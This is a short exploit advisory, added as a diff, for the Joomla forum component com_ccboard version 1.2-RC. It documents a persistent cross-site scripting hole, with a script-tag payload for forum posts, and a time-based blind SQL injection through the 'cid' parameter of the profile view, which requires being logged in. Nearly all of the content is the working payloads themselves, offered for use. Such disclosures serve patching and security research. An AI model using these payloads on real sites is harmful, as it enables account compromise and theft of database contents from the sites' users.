@@ -1,0 +1,20 @@
+# Exploit Title: Joomla Component com_ccboard Multiple Vulnerabilities
+# Date: 13 Nov 2010
+# Author: jdc
+# Category: webapps/0day
+# Version: 1.2-RC
+# Download: http://codeclassic.org/the-downloads/joomla-extensionscomponents/292-ccboard-bulletin-board-forum.html
+
+
+Persistent XSS
+--------------
+ccBoard doesn't filter its posts for HTML... at all:
+<script>prompt(1)</script>
+
+
+Blind SQL Injection
+-------------------
+NOTE: must be logged in
+?option=com_ccboard
+&view=myprofile
+&cid=63 and benchmark(5000000,md5(1))
